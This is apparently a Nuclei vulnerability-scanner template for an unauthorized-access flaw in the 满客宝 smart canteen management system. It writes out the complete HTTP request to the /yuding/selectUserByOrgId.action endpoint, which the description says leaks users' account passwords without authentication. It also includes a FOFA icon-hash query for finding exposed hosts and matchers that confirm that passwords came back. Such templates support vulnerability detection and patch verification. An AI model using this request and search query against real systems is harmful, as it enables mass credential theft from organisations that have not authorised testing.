id: mankebao-unauthorized-access

info:
  name: 满客宝智慧食堂系统 Unauthorized Access
  author: onewin
  severity: high
  description: |
    满客宝智慧食堂系统 selectUserByOrgId 接口处未进行权限控制，导致未经身份验证的远程攻击者可以未授权访问，泄露系统用户账号密码等信息.
  tags: 满客宝后台管理系统
  metadata:
    fofa-query: icon_hash="-409875651"

http:
  - raw:
      - |
        GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "password" 
          - "pinyinName"
      - type: status
        status:
          - 200